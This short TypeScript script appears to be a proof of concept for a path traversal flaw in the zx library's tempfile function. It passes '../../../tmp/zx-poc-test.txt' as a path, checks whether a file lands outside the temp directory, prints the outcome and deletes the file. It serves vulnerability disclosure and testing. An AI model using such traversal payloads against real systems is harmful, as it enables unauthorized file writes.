import { tempfile, $, fs } from './src/index.ts';

const maliciousPath = '../../../tmp/zx-poc-test.txt';

console.log(`Running PoC with path: ${maliciousPath}`);

try {
  const resultPath = tempfile(maliciousPath, 'proof of concept data');
  console.log(`tempfile returned: ${resultPath}`);

  if (fs.existsSync('/tmp/zx-poc-test.txt')) {
    console.log('SUCCESS: Path traversal achieved. File created at /tmp/zx-poc-test.txt');
    const content = fs.readFileSync('/tmp/zx-poc-test.txt', 'utf8');
    console.log(`Content: ${content}`);
    // Cleanup
    fs.unlinkSync('/tmp/zx-poc-test.txt');
  } else {
    console.log('FAILED: Path traversal was not successful. File not found at /tmp/zx-poc-test.txt');
  }
} catch (error) {
  console.error(`Error occurred: ${error.message}`);
}
